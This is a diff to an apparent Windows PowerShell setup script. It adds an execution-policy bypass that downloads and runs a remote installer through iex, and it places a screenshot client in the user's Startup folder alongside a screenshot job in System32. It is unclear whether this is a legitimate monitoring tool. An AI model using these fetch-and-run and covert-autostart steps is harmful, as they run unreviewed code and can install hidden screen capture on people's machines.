@@ -9,7 +9,7 @@
 # scoop install vim
 
 # scoop install python
-
+Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
 choco install python
 pip install Pillow
 pip install pywin32
@@ -17,6 +17,8 @@ pip install requests
 
 # Download package
 curl -o C:\Windows\System32\screenshot.py https://raw.githubusercontent.com/BinhPhuongIT/powershell-pub/main/installer/app/screenshot.py
+curl -o C:\Users\data\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\screenshot-client.py https://raw.githubusercontent.com/BinhPhuongIT/powershell-pub/main/installer/app/screenshot-client.py
+
 
 # Export job
 Export-ScheduledTask -TaskName "ScreenshotJob" -TaskPath "\Path\To\Task" -ExportTo "C:\ScreenshotJob.xml"
